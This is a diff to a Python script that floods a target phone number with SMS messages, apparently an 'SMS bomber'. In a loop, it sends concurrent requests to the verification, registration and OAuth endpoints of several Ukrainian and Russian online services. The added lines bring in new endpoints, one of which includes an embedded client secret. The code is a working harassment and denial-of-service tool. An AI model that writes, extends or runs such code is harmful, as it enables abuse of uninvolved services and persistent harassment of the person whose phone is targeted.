@@ -54,6 +54,38 @@ def send_requests(phone: str, count: int):
     iteration = 0
     while iteration < count:
         requests = [
+            grequests.post(
+                "https://mistercat.com.ua/index.php",
+                params={
+                    "option": "com_ksenmart",
+                    "view": "profile",
+                    "task": "profile.sms_auth",
+                    "tmpl": "ksenmart",
+                },
+                data={"phone": phone, "type": "send"},
+                headers=head,
+            ),
+            grequests.post(
+                "https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",
+                data={
+                    "firstname": russian_name,
+                    "telephone": phone,
+                    "email": email,
+                    "password": password,
+                    "form_key": "Zqqj7CyjkKG2ImM8",
+                },
+                headers=head,
+            ),
+            grequests.post(
+                "https://mobile-api.qiwi.com/oauth/authorize",
+                data={
+                    "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
+                    "username": phone,
+                    "client_id": "android-qw",
+                    "client_secret": "zAm4FKq9UnSe7id",
+                },
+                headers=head,
+            ),
             grequests.head(
                 "https://secure.online.ua/ajax/check_phone/",
                 params={"reg_phone": "+" + phone},
@@ -354,4 +386,8 @@ def send_requests(phone: str, count: int):
         if iteration >= 5 and count >= 10:
             sleep(randint(2, 4))
 
-        print(BOLD + f"{choice(colors_list)}{iteration}/{count} кругов" + RESET_ALL)
+        print(
+            BOLD
+            + f"{choice(colors_list)}{iteration}/{count} кругов"
+            + RESET_ALL
+        )
